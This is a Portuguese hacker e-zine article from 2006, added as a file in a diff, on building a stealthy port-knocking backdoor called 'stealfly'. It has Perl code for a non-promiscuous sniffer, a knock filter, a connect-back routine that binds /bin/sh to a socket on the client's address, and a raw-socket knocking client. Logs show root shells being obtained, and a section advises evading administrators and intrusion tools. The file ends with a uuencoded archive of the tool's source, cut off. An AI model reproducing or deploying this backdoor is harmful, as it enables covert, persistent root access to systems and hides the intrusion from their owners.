@@ -1,0 +1,1039 @@
+[ --- The Bug! Magazine
+
+                    _____ _              ___               _
+                   /__   \ |__   ___    / __\_   _  __ _  / \
+                     / /\/ '_ \ / _ \  /__\// | | |/ _` |/  /
+                    / /  | | | |  __/ / \/  \ |_| | (_| /\_/
+                    \/   |_| |_|\___| \_____/\__,_|\__, \/
+                                                   |___/
+
+                      [ M . A . G . A . Z . I . N . E ]
+
+
+             [ Numero 0x01 <---> Edicao 0x01 <---> Artigo 0x07 ]
+
+
+
+.> 23 de Marco de 2006,
+.> The Bug! Magazine < staff [at] thebugmagazine [dot] org >
+
+
+
+
+
+                  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+                              Port Knocking
+                  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+
+
+.> 22 de Fevereiro de 2006,
+.> hash < hash [at] gotfault [dot] net >
+
+
+        If I don't drive around the park,
+        I'm pretty sure to make my mark.
+        If I'm in bed each night by ten,
+        I may get back my looks again.
+        If I abstain from fun and such,
+        I'll probably amount to much;
+        But I shall stay the way I am,
+        Because I do not give a damn.
+                        -- Dorothy Parker
+
+
+
+[ --- Indice
+
++     1.     <--->  Introducao
++     2.     <--->  Conhecimento necessarios
++     3.     <--->  Estrutura basica de um port-knocking backdoor
++     4.     <--->  Exemplo Pratico
++     5.     <--->  Implementando o server
++       5.1.  <->     O Sniffer
++       5.2.  <->     O Filtro
++       5.3.  <->     A Rotina a executar
++       5.4.  <->     Funcionou ?
++     6.     <--->  Implementando o client
++       6.1.  <->     Raw Sockets
++       6.2.  <->     O Socket Cliente
++     7.     <--->  Evasao
++     8.     <--->  Conclusao
++     9.     <--->  Referencias
++     10.    <--->  Agradecimentos
+
+
+
+[ ---  1. Introducao
+
+
+Este documento nao visa explorar assuntos de ambito hacker como definicoes e
+diferencas entre black hat, white hat, cracker, etc.., acredito que pre-concei-
+tos sempre sao negativos de alguma forma. O uso que se da ao conhecimento pode
+ser para o bem ou para o mal, isso depende da pessoa que o aplica. E' o mesmo
+que dizer que a internet e' um mal porque permite pornografia infantil, disse-
+minacao de informacao sigilosa, difamacoes etc e tal. A internet e' o meio de
+comunicao talvez mais democratico que exista, permitindo a todos sem execoes (a
+nao ser as financeiras que privam os menos favorecidos a tecnologia) um lugar
+comum para se discutir ideias e compartilhar conhecimento. Como diria meu fale-
+cido avo, que eu nao cheguei a conhecer, "O saber nao ocupa lugar".
+
+Vamos entao tentar esclarecer alguns conceitos que para alguns podem nao ser
+conhecidos, entao deixem-me oferecer algumas definicoes que me parecem uteis
+para a compreensao total deste paper:
+
+
++ BackDoor:
+
+Um backdoor e' por natureza, algum software/ferramenta ou mecanismo que visa
+oferecer acesso indevido a um sistema de computador.
+
+Existem hoje muitos tipos funcionais de backdoors, que vem sendo aprimorados
+com o passar do tempo. Entao os Backdoors sao divididos em alguns sub-niveis
+conceituais ou de aplicacao, vou citar alguns:
+
+
+        Kernel Backdoor ou lkm (loadable kernel module):
+        Nao abordado nesse texto Funcionam a nivel de kernel como um objeto .o,
+        mais precisamente um modulo do kernel. Geralmente sao muito sofistica-
+        dos.
+
+			
+	Backdoor comum: 
+        Nao abordado nesse texto (quero deixar claro que alguns dos termos uti-
+        lizados estao vindo da minha cabeca, nao tenho a intencao de ser "exa-
+        to" mas sim ser o mais claro possivel).
+		
+	Baseia-se em geralmente um sistema cliente/servidor, o qual o host alvo
+	executa o "servidor" provendo um acesso externo, com isso deixando uma
+	porta aberta na maquina alvo, a qual o "cliente" conecta-se e pode en-
+	fim executar seus comandos.
+
+
+	Backdoors avancados:
+	Procuram se utilizar de tecnicas de evasao e nao deixar tantos rastros
+	que poderiam ser facilmente seguidos pelo administrador do sistema.
+
+
+Este paper trata de um metodo avancado de implementacao de um backdoor. Procu-
+rando tornar-se mais evasivo e silencioso que metodos mais tradicionais.
+
+	Port-Knocking BackDoor:
+
+	Port Knocking backdoor tem como principal caracterista o fato de nao
+	estar ativamente escutando uma porta TCP, isso pode soar estranho, mas
+	e' exatamente assim que ele funciona.
+
+	E nesse documento vamos discutir caracteristas, teorias e metodologias
+	de implementacao tanto para uso em backdoors quanto em uma forma de
+	obscurecer certos servicos em um host.
+
+
+
+[ ---  2. Conhecimento necessarios
+
+Para a melhor aproveitamento deste paper se faz necessario que o leitor possua
+alguma , nao necessariamente profundos conhecimentos, mas alguma nocao de
+TCP/IP, linguagens de programacao como Perl e C, Linux/Unix, sockets.
+
+O uso de ferramentas como o Nmap tambem sera util.
+
+
+
+[ ---  3. Estrutura basica de um port-knocking backdoor
+
+Em seu codigo, o programa precisa ser capaz de sniffar uma determinada interfa-
+ce, que sera usada pelo client para o envio dos datagramas, que serao filtrados
+pelo sniffer, analisados e entao sera tomada a decisao de fornecer acesso ou
+nao.
+
+O sniffer em questao precisa ao minimo ser furtivo o suficiente para nao setar
+a interface em modo promiscuo, o que seria facilmente detectado pela maioria
+das ferramentas anti-intrusao ou mesmo um simples "/sbin/ifconfig -a" colocaria
+tudo a perder. Uma interface em modo promiscuo se pareceria da seguinte forma:
+
+
+	eth1      Link encap:Ethernet  HWaddr 00:E0:7D:E6:EF:D0
+          inet addr:10.10.10.1  Bcast:10.10.10.255  Mask:255.255.255.0
+          inet6 addr: fe80::2e0:7dff:fee6:efd0/64 Scope:Link
+          UP BROADCAST PROMISC MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000
+          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)
+          Interrupt:5 Base address:0xb000
+
+
+Observe a linha: UP BROADCAST PROMISC MULTICAST  MTU:1500  Metric:1
+		
+Fica evidente que a interface esta sendo sniffada de alguma forma, o que leva-
+ria o administrador a tomar providencias.
+
+ 
+
+[ ---  4. Exemplo pratico 
+
+Se realmente nunca viu um backdoor em acao, vou aqui demonstrar rapidamente a
+execucao de um exemplo. Mas se voce ja possui mais experiencia, sugiro que pule
+este exemplo.
+		
+Imagine que voce esta logado em uma maquina remota, por alguma razao obscura
+(ou nao tao obscura assim) voce possui acesso shell a maquina, e o melhor ain-
+da, voce e' ROOT. Com um backdoor em maos o procedimento seria o seguinte:
+
+
+	root@godfather:/home/hash/security/tools/stealfly# ./server.pl
+	root@godfather:/home/hash/security/tools/stealfly#
+
+
+Agora o server.pl esta sendo executado em background. Voce desloga da maquina,
+e a proxima etapa (munido do client ou nao, dependendo da implementacao) sera
+acionar o client para logar na maquina alvo:
+
+
+	root@godfather:/home/hash/security/tools/stealfly# ./client.pl -b localhost localhost 8080
+	Stealfly written by hash
+	[!] Bindport method
+	[*] Sending range of UDP packets to 127.0.0.1:80 ...
+	[!] Sent!
+	[!] Connected on: 127.0.0.1:8080
+	[!] exit or control+c to leave
+
+	Linux godfather 2.6.7 #4 SMP Mon Aug 29 17:15:09 BRT 2005 i686 unknown unknown GNU/Linux
+	uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
+
+
+Nesse ponto, como voce pode observar, estara apto a executar comandos na maqui-
+na remota.
+
+
+
+[ ---  5. Implementando o Server
+
+
+[ ---  5.1. O Sniffer
+		
+Talvez, ao menos no mundo *nix o sniffer mais popular seja o tcpdump. Mas na
+pratica nao e' tao complicado escrever seu proprio sniffer, utilizando-se a bi-
+blioteca pcap.h em C, em Perl seu equivalente e' Net::PcapUtils. O Tcpdump uti-
+liza pcap.h assim como muitos outros sniffers disponiveis.
+
+O procedimento e' interceptar os pacotes que chegam a determinada interface e
+analizar os dados contidos nesses datagramas, como por exemplo porta de origem,
+porta de destino, dados, ip destino, ip origem, etc. Em Perl um sniffer se pa-
+rececia com esse trecho de codigo:
+
+
+-------------- code ----------------
+
+#Inicia a interface em modo nao promiscuo
+
+Net::PcapUtils::loop(\&sniffit,Promisc=>0, #nao promiscuo
+                               NUMPACKETS=>5, #numero de pacotes a serem intercepatos por vez
+                               FILTER=>"udp and port 9090", #protocolo e porta a ser escutada
+                               DEV=>eth0); #device
+
+
+my ($args,$header,$packet) = @_;
+
+$ip = NetPacket::IP->decode(eth_strip($packet)); #Filtrando IP
+$tcp = NetPacket::TCP->decode($ip->{data}); #Filtrando TCP 
+$get_data = $ip->{data}; #capturando os dados contidos no datagrama
+$tcporigem = $tcp->{src_port}; #capturando a porta de origem
+$iporigem = $ip->{src_ip}; #capturando o ip de origem
+
+-------------- code ----------------
+
+
+Essa simplificacao nos permite perceber como a filtragem do datagrama sera fei-
+to. Primeiro "abrimos" os datagramas IP e TCP, uma vez abertos temos acesso ao
+seu conteudo como ip de orgem/destino, porta de origem e dados.
+
+
+
+[ --- 5.2. O Filtro
+
+Atraves do manuseio dessas informacoes podemos em seguida estabelecer as regras
+que serao seguidas de acordo com a informacao que chega:
+
+
+-------------- code ----------------
+.
+.
+.
+my $allow = 9090;
+ if($orig_addr eq '127.0.0.1') { #Se o ip de orgigem bate com o que esperamos
+                        if($srcport eq $allow) { #Se a porta de origem tambem confere...
+                                
+				#analizamos os dados, nesse caso se espera uma string 'connback'
+				#se contiver essa string seguimos a rotina:
+                                if($get_data =~ /connback/) {
+					faz algo...
+				}
+.
+.
+.
+-------------- code ----------------
+
+
+Como voce ja percebeu a logica toda e' muito simples. Nao pretendo entrar em
+detalhes de programacao, porque isso merececia um documento extra, mas sim ex-
+por a logica por tras desse metodo ainda nao tao difundido.
+		
+Preciso fazer mencao ao primeiro documento que li a respeito que foi de FX da
+phenoelit, foi a primeira implementacao desse meteodo. No caso do codigo do FX
+ele filtra os datagramas na espera de uma certa sequencia de SYN/ACK que pode
+ser gerado pelo nmap.
+
+	
+
+[ ---  5.3. A Rotina a executar
+	
+E para efeito de conhecimento segue um possivel trecho de codigo que realiza um
+connect-back em destino ao client, sendo satisfeitas todas as regras anteriores:
+
+
+-------------- code ----------------
+
+        sub conn_back() {
+                sleep(4); #Dorme por 4 segundos para dar tempo ao client
+                $execute = '/bin/sh'; #Vamos executar /bin/sh nessa rotina
+                $get_addr = inet_aton($iporigem);
+                $paddr = sockaddr_in($conn_back_port, $get_addr);
+                $ptc = getprotobyname('tcp');
+                socket(S, PF_INET, SOCK_STREAM, $ptc);
+                connect(S, $paddr);
+                S->autoflush(1);
+		
+		#direcinando a saida ao socket
+                open(STDIN, ">&S");open(STDOUT, ">&S");open(STDERR, ">&S");
+                system($execute);
+        }
+-------------- code ----------------
+
+
+Essa funcao acima realiza um connect-back no ip de origem do datagrama, pode
+ser considerada como uma forma de evasao ao netfilter que muito frequentemente
+bloqueia acesso remoto a portas arbitrarias mas muitas vezes permite a conexao
+server -> client:porta.
+
+	
+
+[ ---  5.4. Funcionou ?
+
+Ao startar o server (que vai esperar por datagramas direcionados a porta 80 pa-
+ra em seguida liberar o acesso remoto na porta 9090:
+
+
+	# ./server.pl
+	#
+
+
+Agora veja com nmap:
+
+
+	root@godfather:/home/hash/security/tools/stealfly# nmap localhost -p 1-65535
+
+	Starting nmap 3.50 ( http://www.insecure.org/nmap/ ) at 2006-02-23 01:48 BRT
+	Interesting ports on localhost.localdomain (127.0.0.1):
+	(The 65532 ports scanned but not shown below are in state: closed)
+	PORT      STATE SERVICE
+	443/tcp   open  https
+	6667/tcp  open  irc
+	61515/tcp open  unknown
+
+	Nmap run completed -- 1 IP address (1 host up) scanned in 46.268 seconds
+	root@godfather:/home/hash/security/tools/stealfly#
+
+
+Como fica evidente, nao temos a porta 9090 aberta muito menos a 80. Mais a
+frente na secao CLIENT vamos ter mais detalhes.
+
+		
+
+[ ---  6. Implementando o Client
+	
+	
+[ ---  6.1. Raw Sockets
+
+Muito bom o servidor estar escutando uma interface, uma porta, um datagrama.
+Mas de que vai adiantar isso se nao pudermos gerar nossos proprios datagramas?
+Com portas, ip`s etc. arbitrarios? Isso so e' possivel com o uso de Raw Sockets.
+
+Para se manipular datagramas dessa forma e' essencial conhecimentos sobre o
+stack TCP/IP. Um exelente documento sobre Raw Sockets e TCP/IP pode ser lido
+(em ingles) no link:
+
+	http://www.madchat.org//coding/c/c.rezo/rawsckt/raw_socket.txt
+
+O documento aborda uma perspectiva C. No nosso caso faremos em Perl por enquan-
+to (em medio prazo pretendo desenvolver um paper sobre Raw Sockets abordando a
+linguagem C ANSI). Em Perl usamos a o modulo (biblioteca) Net::RawIP. 
+
+
+-------------- code ----------------
+
+#Primitiva de servico raw socket, nesse caso UDP
+$packet = new Net::RawIP({udp=>{}});
+
+#Serao 5 pacotes enviados em sequencia (para ser aceito pelo server)
+for($x=0;$x<=4;$x++){
+
+#Cada datagrama tera uma porta de origem diferente
+@tmpport = (739,666,2001,3055,8000);
+
+$packet->set({
+              ip => { saddr => $iface,       #IP de orgiem (arbitrario)
+                      daddr => $server       #IP de destino (server)
+                    },
+              udp => { source => $tmpport[$x], #Vetor para cada uma das 5 portas de origem
+                       dest => 80, #porta 80 de destino, geralmente aceita (web)
+                       len => 5, 
+                       data => $send_data #data (string)
+                      }
+             });
+
+$packet->send(0,1); #envia o datagrama
+
+-------------- code ----------------
+
+
+
+[ ---  6.2. O Socket Cliente
+
+Simples nao? O datagrama e' gerado e enviado ao endereco de destino. Vamos a
+segunda parte do client:
+
+
+-------------- code ----------------
+.
+.
+.
+$local = IO::Socket::INET->new(Listen=>1,
+                               Proto=>'tcp', #Protocolo
+                               LocalAddr=>'127.0.0.1', #Ip local
+                               LocalPort=>9090, #porta local
+                               ReuseAddr=>1,) or die "$!";
+
+$local->autoflush(1);
+
+#Aceita a conexao
+$addr = $local->accept();
+.
+.
+.
+
+-------------- code ----------------
+
+
+O exemplo acima funcionaria para o connect-back ja que abre uma porta no ende-
+reco local a espera de uma conexao vinda do servidor.
+
+
+
+[ ---  7. Evasao
+
+Tecnicas de evasao sempre sao necessarias em backdoors, deve-se dificultar sua
+deteccao pelo administrador do sistema e ferramentas de que ele se utiliza.
+
+Uma boa forma e' voce criar sua propria ferramenta, sendo ela "desconhecida"
+fica mais dificil que ela seja filtrada por alguma ferramenta de anti-intrusao
+que sempre procuram por padroes, como diretorios com nomes especificos, proces-
+sos comuns de sistema, arquivos caracteristicos, etc.
+
+Os mais eficientes backdoors sao os LKM (loadable Kernel Module) por serem exe-
+cutados a nivel de kernel (.o na versao 2.4.X e .ko na 2.6.X) como modulos, po-
+dem ser carregados na inicializacao do sistema, nao aparecendo 	na lista de
+processos de sistema, porem podem ser detectados na listagem de modulos ativos
+(lsmod), ai seria necessario trojanar certos aplicativos a fim de de tornar o
+sistema mais invisivel.
+
+Alterar o source code de um backdoor de terceiros tambem pode ser uma solucao
+para evitar a deteccao, como diretorios default, nomes de arquivos, comporta-
+mento, etc.
+
+O grande Gol do backdoor port-knocking e' posibilitar que o servidor nao deixe
+nenhuma porta aberta ativa, abrindo esta somente quando necessario.
+
+
+		
+[ ---  8. Conclusao
+
+Vamos verificar como o backdoor se comporta:
+
+
+	root@godfather:/home/hash/security/tools/stealfly# ./server.pl
+	root@godfather:/home/hash/security/tools/stealfly#
+
+
+Em outro terminal:
+
+
+	# nmap localhost -p 8080
+
+	Starting nmap 3.50 ( http://www.insecure.org/nmap/ ) at 2006-02-23 01:21 BRT
+	Interesting ports on localhost.localdomain (127.0.0.1):
+	PORT     STATE  SERVICE
+	8080/tcp closed http-proxy
+
+	Nmap run completed -- 1 IP address (1 host up) scanned in 0.648 seconds
+	root@godfather:/home/hash/security/tools/stealfly#
+
+	# ./client.pl -b 127.0.0.1 127.0.0.1 8080
+	Stealfly written by hash
+	[!] Bindport method
+	[*] Sending range of UDP packets to 127.0.0.1:80 ...
+	[!] Sent!
+	[!] Connected on: 127.0.0.1:8080
+	[!] exit or control+c to leave
+	
+	Linux godfather 2.6.7 #4 SMP Mon Aug 29 17:15:09 BRT 2005 i686 unknown unknown GNU/Linux
+	uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
+
+
+Novamente em um terceiro terminal:
+
+
+	root@godfather:~# nmap localhost -p 8080
+
+	Starting nmap 3.50 ( http://www.insecure.org/nmap/ ) at 2006-02-23 01:22 BRT
+	Interesting ports on localhost.localdomain (127.0.0.1):
+	PORT     STATE SERVICE
+	8080/tcp open  http-proxy
+
+	Nmap run completed -- 1 IP address (1 host up) scanned in 0.723 seconds
+	root@godfather:~#
+
+
+Connect Back:
+
+
+	root@godfather:/home/hash/security/tools/stealfly# ./client.pl -c 127.0.0.1 127.0.0.1 9090
+	Stealfly written by hash
+	[!] Connect Back method
+	[*] Sending range of UDP packets to 127.0.0.1:80 ...
+	[!] Sent!
+	[*] Waiting for remote connect back on 127.0.0.1:9090
+	[!] Connection made from: 127.0.0.1:32933
+	[!] exit or control+c to leave
+	command> id
+	uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
+	Command>
+
+
+Como fica claro nos exemplos, a porta somente sera aberta em caso de real cone-
+xao, ao sair da shell a porta novamente sera fechada e o programa entra em es-
+pera por novos datagramas.
+
+O metodo Port-Knocking tambem pode ser utilizado por administradores de siste-
+mas como uma forma de inicializar/parar determinados servicos como http/ssh/ftp
+etc. Tambem pode lidar com regras dinamicas do netfilter (iptables, ipchains,
+etc.) dinamicamente, voce envia pacote x, libera-se porta y para ip de origem w
+e por ai vai. O unico limite e' a imaginacao do desenvolvedor. Mas e' claro que
+a parte mais divertida fica para o segmento underground.
+
+Esse paper teve como objetivo esclarecer mais sobre esta tecnica ainda nao mui-
+to difundida porem muito util e interessante, que ainda tem muito a oferecer, e
+devemos ainda em breve ver ferramentas bastante flexiveis se utilizando desse
+mecanismo. Porem nao procurei me extender demais no assunto, entrando em deta-
+lhes tecnicos especificos de linguagem ou plataforma, dessa forma procurei ape-
+nas ajudar.
+
+
+
+[ ---  9. Referencias
+
++     http://www.phenoelit.de/fr/tools.html
++     http://www.phenoelit.de/fr/tools.html
++     http://www.madchat.org//coding/c/c.rezo/rawsckt/raw_socket.txt
++     http://www.uwo.ca/its/doc/courses/notes/socket/
+
+
+
+[ ---  10. Agradecimentos
+
++     A todos os membros da:
++     Gotfault <http://gotfault.net>
++     rfdslabs <www.rfdslabs.com.br>
+
++     Alguns nomes: F-117, sandimas, xgc, khz, deadsocket, barros, spud, c0dak,
++     hexdump, Shorgen... 
+
++     E ripando o paper do sandimas, aqui vai um set list que sempre me acompa-
++     nha:
++     Neil Young (TODAS e tambem..) - Keep on Rockin` in the Free World, Like a
++     Hurricane e Cowgirl in the Sand, Scenery;
++     Racionais - Vida Loka I e II, Foda-se a Policia, Sobrevivendo no Inferno;
++     Blind Melon - Change, Mother;
++     SRV - Texas Flood, Voodoo Child;
++     Metallica - One, Fade to Black, My Friend of Misery;
++     Nirvana - Heart Shaped Box, Polly, Something in the Way;
++     The Animals - House of Rising Sun, Please dont let me be misunderstood;
++     Janes Addicion - Simpathy for the Devil, Jane Says, Three Days;
++     Pearl Jam - Immortality, Black;
++     Alice in Chains - Angry Chair, Nutshell, Down in a Hole;
++     E centenas de outras bandas e musicas como Sublime, Legiao, Waterboys, 
++     Agent Orange, D2, The Doors, Cream, RHCP, Manolo Tena, Pink Floyd (claro),
++     Pixies, Suicidal Tendencies, Porno for Pyros, Screaming trees, Anathema...
+
+
+
+begin 644 stealfly.tar
+M<W1E86QF;'E3+G!L````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M`````````````#`P,#`W-34`,#`P,3<U,``P,#`P,30T`#`P,#`P,#$P-C`U
+M`#$P,S4V-C,V-#`W`#`Q,S4P,@`@,```````````````````````````````
+M````````````````````````````````````````````````````````````
+M``````````````````````````````````````````!U<W1A<B`@`&AA<V@`
+M````````````````````````````````````=7-E<G,`````````````````
+M```````````````````P,#`P,#`P`#`P,#`P,#``````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M```````````````````````C(2]U<W(O8FEN+W!E<FP*(PHC(#Q315)615(^
+M"B,*(R`B5&AE<F4@87)E('1W;R!W87ES('1O('=R:71E(&5R<F]R+69R964@
+M<')O9W)A;7,N("`*(R`@3VYL>2!T:&4@=&AI<F0@;VYE('=O<FMS+B(@+2!&
+M;W)T=6YE(&-O;VMI90HC"B,@<W1E86QF;'E3+G!L(&)E=&$@=W)I='1E;B!B
+M>2!H87-H(#QC87)L;W-L86-K(&%T(&=M86EL(&1O="!C;VT^"B,*(R!$97-C
+M<FEP=&EO;CH@0V]N;F5C="U"86-K(#PM/B!":6YD<&]R="!0;W)T+6MN;V-K
+M:6YG($)A8VMD;V]R(%1O;VP*(PHC($=R965T>B!G;V5S('1O.B!H97AD=6UP
+M+"!S86YD:6UA<RP@4VAO<F=E;BP@0V]D86LL(&MH>@HC("`@("`@("`@("`@
+M("`@("!D96%D<V]C:V5T+"!X9V,L(&5N:6%C+"!!8VED+5=A<GHL($8M,3$W
+M+BXN"B,@"B,@4F5Q=6ER960Z"B,@*R!.970Z.E!C87!5=&EL<R`H<&5R;"!M
+M;V1U;&4I"B,@*R!.970Z.E)A=TE0.R`H<&5R;"!M;V1U;&4I"B,@*R!.9710
+M86-K970Z.D5T:&5R;F5T("AP97)L(&UO9'5L92D*(R`K($YE=%!A8VME=#HZ
+M5$-0("AP97)L(&UO9'5L92D*(R`K($YE=%!A8VME=#HZ25`@*'!E<FP@;6]D
+M=6QE*0HC(`HC("H@26YS=&%L;"!P97)L(&UO9'5L97,@9G)O;2!C<&%N+"!E
+M9SH*(R`C(&-P86X@+64@"B,@:6YS=&%L;"!.970Z.E!C87!5=&EL<PHC"B,@
+M24U03U)404Y4.B!S=&5A;&9L>5,N<&P@9&]E<R!N;W0@86-C97!T(&-O;6UA
+M;F0@;&EN92!O<'1I;VYS+"!Y;W4@;F5E9`HC('1O(&-H86YG92!S;VUE('9A
+M<FEA8FQE<RX*(PIU<V4@24\Z.E-O8VME=#L*=7-E($YE=#HZ4&-A<%5T:6QS
+M.PIU<V4@3F5T.CI287=)4#L*=7-E($YE=%!A8VME=#HZ171H97)N970@<7<H
+M.G-T<FEP*3L*=7-E($YE=%!A8VME=#HZ5$-0.PIU<V4@3F5T4&%C:V5T.CI)
+M4"!Q=R@Z<W1R:7`I.PIU<V4@=V%R;FEN9W,["@HC5D%224%"3$53($%214$*
+M(R,C(R,C(R,C(R,C(R,C"B,C(R,C(R,C(R,C(R,C(PHC(R,C(R,C(R,C(R,C
+M(R,*"B-D969I;F4@:&5R92!H;W<@:70@;&]O:W,@;VX@<',L(&9E96P@9G)E
+M92!T;R!C:&%N9V4@:70Z"B0P(#T@(EMH='1P9%TB.PH*(TQO8V%L(&EP.G!O
+M<G0@=&\@;&ES=&5N.@HD;&]C86Q?:69P;W)T(#T@)S$R-RXP+C`N,3HX,#@P
+M)SL*"B-,;V-A;"!I;G1E<F9A8V4@=&\@;&ES=&5N.@HD;&EF86-E(#T@)VQO
+M)SL*"B-3;FEF9F5R('=I;&P@;&ES=&5N(&QO8V%L("AC;&]S960O;W!E;BD@
+M<&]R=#H*)&9I;'1E<E]P;W)T(#T@)S@P)SL*"B-%;G1E<B!S;W5R8V4H8VQI
+M96YT*2!I<"!A9&1R(&]R(&QE879E(&5M<'1Y('1O(&%L;&]W(&-O;FYE8W1I
+M;VYS(&9R;VT@86YY=VAE<F4Z"B1O<FEG7V%D9'(@/2`G)SL*"B-)9B!C;&EE
+M;G0@8VAO<V4@8V]N;F5C="!B86-K(&UE=&AO9"!T:&5N"B-W92!M=7-T('-E
+M="!C;&EE;G1@<R!P;W)T.@HD8V]N;E]B86-K7W!O<G0@/2`G.3`Y,"<["@HC
+M4F%N9V4@;W(@<V]U<F-E(%5$4"!P;W)T<R!S:&%L;"!B92!E<75A;"!T;R!C
+M;&EE;G0Z"B1A;&QO=R`]("<W,SDG.PHD86QL;W<@+CT@)S8V-B<["B1A;&QO
+M=R`N/2`G,C`P,2<["B1A;&QO=R`N/2`G,S`U-2<["B1A;&QO=R`N/2`G.#`P
+M,"<["@HC0VAA;F=E(&ET(&9O<B!Y;W5R('-Y<W1E;3H*)'-S:%]S97)V97)?
+M<W1O<"`]("<O971C+W)C+F0O<F,N<W-H9"!S=&]P)SL*)'-S:%]S97)V97)?
+M<W1A<G0@/2`G+V5T8R]R8RYD+W)C+G-S:&0@<W1A<G0G.PH*(R,C(R,C(R,C
+M(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(PHC(R,C(R,C(R,C(R,C
+M(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,C"B,C(R,C(R,C(R,C(R,C(R,C
+M(R,C(R,C(R,C(R,C(R,C(R,C(R,C(R,*(TY/(%)%05-/3B!43R!#2$%.1T4@
+M04Y95$A)3D<@0D5,3U<@2$5210H*(T%V;VED(&5R<F]R(&UE<W-A9V5S.@IO
+M<&5N(%-41$524BP@(CXO9&5V+VYU;&PB.PH*(T=O97,@8F%C:V=R;W5N9"XN
+M+@IF;W)K(&%N9"!E>&ET.PH*(R!3=&%R=&EN9R!O=7(@;&ET=&QE('-N:69F
+M97(@"G=H:6QE*#$I('L*"B-086-K970@9FEL=&5R+BXN"DYE=#HZ4&-A<%5T
+M:6QS.CIL;V]P*%PF<VYI9F9I="Q0<F]M:7-C/3XP+"`C3F]T('!R;VUI<V,@
+M"@D)("`@("`@("`@("`@("`@3E5-4$%#2T544ST^-2P@(TEF('=E(&AA=F4@
+M-2!51%`@<&%C:V5T<R`*"0D)("`@("`@($9)3%1%4CT^(G5D<"!A;F0@<&]R
+M="`D9FEL=&5R7W!O<G0B+`H)"0D@("`@("`@1$56/3XD;&EF86-E*3L*"B,@
+M0V%L;&)A8VLN+BX*<W5B('-N:69F:70*>PH)"FUY("@D87)G<RPD:&5A9&5R
+M+"1P86-K970I(#T@0%\["@HC4F5T<FEE=FEN9R!I;F9O(&9R;VT@<F5M;W1E
+M(&AO<W0N+BX*)&EP(#T@3F5T4&%C:V5T.CI)4"T^9&5C;V1E*&5T:%]S=')I
+M<"@D<&%C:V5T*2D["B1T8W`@/2!.971086-K970Z.E1#4"T^9&5C;V1E*"1I
+M<"T^>V1A=&%]*3L*"B-2971R:65V92!D871A.@HD9V5T7V1A=&$@/2`D:7`M
+M/GMD871A?3L@"@HC9V5T(&EP(&%D9')E<W,@86YD('-O=7)C92!P;W)T"B1T
+M8W!O<FEG96T@/2`D=&-P+3Y[<W)C7W!O<G1].PH*(U1H:7,@:7`@861D<B!W
+M:6QL(&)E('5S960@9F]R(&-O;FYE8W0@8F%C:R!M971H;V0@.RD*)&EP;W)I
+M9V5M(#T@)&EP+3Y[<W)C7VEP?3L*"0H)(TQI='1L92!T<FEC:R!T;R!I;7!R
+M;W9E('-E8W5R:71Y+BXN"@DC9F]R*#$N+C0I('L*"0DD<W)C<&]R="`N/2`D
+M=&-P;W)I9V5M.PH)(WT*"0EI9B@D;W)I9U]A9&1R(&5Q("<G*2!["@D)"6EF
+M*"1S<F-P;W)T(&5Q("1A;&QO=RD@>R`C4&5R;6ET(&-O;FYE8W1I;VX@9G)O
+M;2!R:6=H="!S;W5R8V4@<&]R=',*"0D)"2-#86QL('-E;&5C=&5D(&UE=&AO
+M9"XN+@H)"0D):68H)&=E=%]D871A(#U^("]C;VYN8F%C:R\I('LF8V]N;E]B
+M86-K?0H)"0D):68H)&=E=%]D871A(#U^("]B:6YD<&]R="\I('LF<W5B7W-O
+M8VME='T*"0D)"6EF*"1G971?9&%T82`]?B`O<W1A<G1S<V@O*2![)G-T87)T
+M<W-H?0H)"0D):68H)&=E=%]D871A(#U^("]S=&]P<W-H+RD@>R9S=&]P<W-H
+M?0H)"0E](&5L<V4@>PH)"0D))&YU;&PS,W0@/2`G)SL*"0D@("`@("`@('T)
+M("`@("`@(`H)"7UE;'-E>PH)"0EI9B@D<W)C<&]R="`]/2`D86QL;W<@)B8@
+M)&EP;W)I9V5M(&5Q("1O<FEG7V%D9'(I('L@(U!E<FUI="!C;VYN96-T:6]N
+M(&9R;VT@<FEG:'0@<V]U<F-E('!O<G1S(&%N9"!I<`H)"0D)(T-A;&P@;65T
+M:&]D+BXN"@D)"0EI9B@D9V5T7V1A=&$@/7X@+V-O;FYB86-K+RD@>R9C;VYN
+M7V)A8VM]"@D)"0EI9B@D9V5T7V1A=&$@/7X@+V)I;F1P;W)T+RD@>R9S=6)?
+M<V]C:V5T?0H)"0D):68H)&=E=%]D871A(#U^("]S=&%R='-S:"\I('LF<W1A
+M<G1S<VA]"@D)"0EI9B@D9V5T7V1A=&$@/7X@+W-T;W!S<V@O*2![)G-T;W!S
+M<VA]"@D)"7T@96QS92!["@D)"0DD;G5L;#,S="`]("<G.PH)"0E]"@D)?2`*
+M?0H*<W5B('-T87)T<W-H*"D@>PH)<WES=&5M*"1S<VA?<V5R=F5R7W-T87)T
+M*0I]"@IS=6(@<W1O<'-S:"@I>PH)<WES=&5M*"1S<VA?<V5R=F5R7W-T;W`I
+M"GT*"G-U8B!S=6)?<V]C:V5T*"D@>PH*(U-T87)T:6YG(&QI<W1E;FYE<BXN
+M+@HD;&]C86P@/2!)3SHZ4V]C:V5T.CI)3D54+3YN97<H4')O=&\]/B=T8W`G
+M+`H)"0D@("`@("`@3&]C86Q!9&1R/3XD;&]C86Q?:69P;W)T+`H)"0D@("`@
+M("`@4F5U<V4]/C$L*2!O<B!D:64@(B0A(CL*"B1L;V-A;"T^;&ES=&5N*"D@
+M;W(@9&EE("(D(5QN(CL)"B1L;V-A;"T^875T;V9L=7-H*#$I.PDC5&\@<F5S
+M<&]N9"!N;W<*"B-#;&EE;G0@:&%N9&QE+BXN"FUY("1A9&1R.R`*=VAI;&4@
